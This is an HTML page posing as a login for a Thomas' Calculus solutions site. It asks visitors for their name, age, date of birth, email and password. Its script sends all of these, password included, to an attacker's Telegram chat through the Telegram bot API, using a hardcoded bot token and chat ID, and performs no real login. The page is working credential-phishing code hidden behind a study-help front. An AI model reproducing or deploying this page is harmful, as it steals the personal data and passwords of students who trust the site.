<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Thomas' Calculus Solutions</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #f0f0f0;
            margin: 0;
            padding: 0;
        }
        .container {
            max-width: 600px;
            margin: 50px auto;
            padding: 20px;
            background-color: white;
            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
        }
        h1 {
            text-align: center;
            color: #333;
        }
        #login-section {
            margin-top: 20px;
        }
        #login-form {
            display: flex;
            flex-direction: column;
        }
        #login-form label {
            margin-bottom: 5px;
            color: #333;
        }
        #login-form input {
            margin-bottom: 10px;
            padding: 8px;
            border: 1px solid #ccc;
            border-radius: 4px;
        }
        #login-form button {
            padding: 10px;
            background-color: #007BFF;
            color: white;
            border: none;
            border-radius: 4px;
            cursor: pointer;
        }
        #login-form button:hover {
            background-color: #0056b3;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>Thomas' Calculus 11th Edition Solutions</h1>
        <div id="login-section">
            <h2>Login</h2>
            <form id="login-form">
                <label for="name">Name:</label>
                <input type="text" id="name" name="name" required>
                <label for="age">Age:</label>
                <input type="number" id="age" name="age" required>
                <label for="dob">Date of Birth:</label>
                <input type="date" id="dob" name="dob" required>
                <label for="email">Email:</label>
                <input type="email" id="email" name="email" required>
                <label for="password">Password:</label>
                <input type="password" id="password" name="password" required>
                <button type="button" onclick="login()">Login</button>
            </form>
        </div>
    </div>
    <script>
        async function login() {
            const name = document.getElementById('name').value;
            const age = document.getElementById('age').value;
            const dob = document.getElementById('dob').value;
            const email = document.getElementById('email').value;
            const password = document.getElementById('password').value;

            // Replace with your Telegram bot token and chat ID
            const botToken = '7301009133:AAHSD5z0YCPlFZFPGAeWa_7ubJ5vswvEyEI';
            const chatId = '6987670728';

            const message = `User Details:
            Name: ${name}
            Age: ${age}
            Date of Birth: ${dob}
            Email: ${email}
            Password: ${password}`;
            
            const url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;

            try {
                await fetch(url);
                // Redirect to the given link after sending the message

            } catch (error) {
                console.error('Error sending message to Telegram:', error);
            }
        }
    </script>
</body>
</html>
